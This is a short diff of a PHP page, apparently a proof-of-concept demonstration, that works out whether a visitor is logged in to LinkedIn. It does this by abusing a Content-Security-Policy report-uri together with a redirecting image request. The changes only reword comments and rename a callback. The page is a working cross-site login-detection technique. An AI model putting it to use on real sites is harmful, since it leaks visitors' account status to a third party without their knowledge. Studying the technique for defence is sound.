@@ -3,11 +3,11 @@
 	$id = session_id();
 
 	// apc is php's native cross-process cache 
-	// (we can read it's values in a request to status.php)
+	// (we can read it's values in a request to report-uri.php & status.php)
 	apc_store($id."","0");
 	
-	// 1. Allow image requests only to https://fr.linkedin.com
-	// 2. Report any other request to our report-uri and send the user's session id  
+	// 1. Allow image requests only to the domain https://fr.linkedin.com
+	// 2. Report any other request to our report-uri and append the user's session id 
 	header("Content-Security-Policy: img-src https://fr.linkedin.com; report-uri /report-uri.php?id=".$id);
 ?>
 <!DOCTYPE html>
@@ -24,12 +24,12 @@
 	</style>
 </head>
 <body>
-<!-- Make a request to an url that redirects to https://www.linkedin.com only if the user is logged in -->
-<img src="https://fr.linkedin.com" onerror="done()">
+<!-- Perform a request to an url that redirects to https://www.linkedin.com only if the user is logged in -->
+<img src="https://fr.linkedin.com" onerror="willFail()">
 
 <!-- Wait until request to report-uri is sent and display status -->
 <script>
-	function done(){
+	function willFail(){
 		setTimeout(function(){	
 			window.location = '/status.php';
 		}, 200);
